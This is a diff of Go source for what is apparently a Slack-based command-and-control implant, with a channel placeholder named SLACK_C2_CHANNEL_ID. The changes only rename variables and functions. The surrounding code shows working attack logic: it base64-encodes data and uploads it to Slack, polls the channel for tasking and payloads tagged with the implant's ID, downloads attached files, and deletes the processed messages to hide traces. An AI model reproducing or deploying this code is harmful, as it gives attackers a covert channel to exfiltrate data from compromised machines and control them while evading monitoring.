@@ -29,7 +29,7 @@ const (
 
 var (
 	token = ""
-	channel_id = "{SLACK_C2_CHANNEL_ID}"
+	channelId = "{SLACK_C2_CHANNEL_ID}"
 	seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
 	username string
 )
@@ -208,12 +208,12 @@ func slackResults(result map[string]interface{}) {
 func createSlackContent(slackName string, description string, data []byte) bool {
 	stringified := base64.StdEncoding.EncodeToString(data)
 	requestBody := url.Values{}
-    requestBody.Set("channels", channel_id)
+    requestBody.Set("channels", channelId)
     requestBody.Set("initial_comment", fmt.Sprintf("%s | %s", slackName, description))
 	requestBody.Set("content", stringified)
 
 	var result map[string]interface{}
-	json.Unmarshal(post_form("https://slack.com/api/files.upload", requestBody), &result);
+	json.Unmarshal(postFormWithAuth("https://slack.com/api/files.upload", requestBody), &result);
 
 	return result["ok"].(bool);
 }
@@ -223,7 +223,7 @@ func createSlack(slackName string, description string, data []byte) bool {
 	stringified := base64.StdEncoding.EncodeToString(data)
 	slackText := fmt.Sprintf("%s | %s", slackName, stringified);
 	requestBody, err := json.Marshal(map[string]string{
-		"channel": channel_id,
+		"channel": channelId,
 		"text": slackText,
 	})
 	
@@ -233,7 +233,7 @@ func createSlack(slackName string, description string, data []byte) bool {
 	}
 	
 	var result map[string]interface{}
-	json.Unmarshal(post_request("https://slack.com/api/chat.postMessage", requestBody), &result);
+	json.Unmarshal(postRequestWithAuth("https://slack.com/api/chat.postMessage", requestBody), &result);
 
 	return result["ok"].(bool);
 }
@@ -243,7 +243,7 @@ func getSlackMessages(slackType string, uniqueID string) []string {
 	var msgs []byte
 
 	var result map[string]interface{}
-	msgs = get_request(fmt.Sprintf("https://slack.com/api/conversations.history?channel=%s&oldest=%d", channel_id, time.Now().Unix()-slackTimeout*2))
+	msgs = getRequestWithAuth(fmt.Sprintf("https://slack.com/api/conversations.history?channel=%s&oldest=%d", channelId, time.Now().Unix()-slackTimeout*2))
 	json.Unmarshal(msgs, &result);
 
 	if result["ok"] == false {
@@ -256,7 +256,7 @@ func getSlackMessages(slackType string, uniqueID string) []string {
 		if strings.Index(fmt.Sprintf("%s", text), fmt.Sprintf("%s-%s", slackType, uniqueID)) == 0 {
 			contents = append(contents, strings.SplitN(fmt.Sprintf("%s", text), " | ", 2)[1])
 			requestBody, err := json.Marshal(map[string]interface{}{
-				"channel":channel_id,
+				"channel":channelId,
 				"ts":result["messages"].([]interface{})[i].(map[string]interface{})["ts"],
 			})
 			
@@ -265,7 +265,7 @@ func getSlackMessages(slackType string, uniqueID string) []string {
 			}
 
 			if (!strings.Contains(slackType,"payloads")) {
-				post_request("https://slack.com/api/chat.delete", requestBody);
+				postRequestWithAuth("https://slack.com/api/chat.delete", requestBody);
 			}
 		}
 	}
@@ -278,7 +278,7 @@ func getSlacks(slackType string, uniqueID string) []string {
 	var msgs []byte
 
 	var result map[string]interface{}
-	msgs = get_request(fmt.Sprintf("https://slack.com/api/conversations.history?channel=%s&oldest=%d", channel_id, time.Now().Unix()-slackTimeout*2))
+	msgs = getRequestWithAuth(fmt.Sprintf("https://slack.com/api/conversations.history?channel=%s&oldest=%d", channelId, time.Now().Unix()-slackTimeout*2))
 	json.Unmarshal(msgs, &result);
 
 	if result["ok"] == false {
@@ -290,10 +290,10 @@ func getSlacks(slackType string, uniqueID string) []string {
 		text := result["messages"].([]interface{})[i].(map[string]interface{})["text"]
 		if strings.Index(fmt.Sprintf("%s", text), fmt.Sprintf("%s-%s", slackType, uniqueID)) == 0 {
 			url_file = result["messages"].([]interface{})[i].(map[string]interface{})["files"].([]interface{})[0].(map[string]interface{})["url_private_download"].(string)
-			contents = append(contents, fmt.Sprintf("%s", get_request(url_file)))
+			contents = append(contents, fmt.Sprintf("%s", getRequestWithAuth(url_file)))
 			
 			requestBody, err := json.Marshal(map[string]interface{}{
-				"channel":channel_id,
+				"channel":channelId,
 				"ts":result["messages"].([]interface{})[i].(map[string]interface{})["ts"],
 			})
 			
@@ -302,7 +302,7 @@ func getSlacks(slackType string, uniqueID string) []string {
 			}
 
 			if (!strings.Contains(slackType,"payloads")) {
-				post_request("https://slack.com/api/chat.delete", requestBody);
+				postRequestWithAuth("https://slack.com/api/chat.delete", requestBody);
 			}
 		}
 	}
@@ -330,7 +330,7 @@ func getNewUploadId() string {
 	return strconv.Itoa(rand.Int())
 }
 
-func post_request(address string, data []byte) []byte {
+func postRequestWithAuth(address string, data []byte) []byte {
 	req, err := http.NewRequest("POST", address, bytes.NewBuffer(data))
 	req.Header.Set("Authorization", "Bearer " + token)
 	req.Header.Set("Content-Type", "application/json")
@@ -357,7 +357,7 @@ func post_request(address string, data []byte) []byte {
 	return body
 }
 
-func post_form(address string, data url.Values) []byte {
+func postFormWithAuth(address string, data url.Values) []byte {
 	req, err := http.NewRequest("POST", address, strings.NewReader(data.Encode()))
 	req.Header.Set("Authorization", "Bearer " + token)
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
@@ -384,7 +384,7 @@ func post_form(address string, data url.Values) []byte {
 	return body
 }
 
-func get_request(address string) []byte {
+func getRequestWithAuth(address string) []byte {
 	req, err := http.NewRequest("GET", address, nil)
 	req.Header.Set("Authorization", "Bearer " + token)
 	
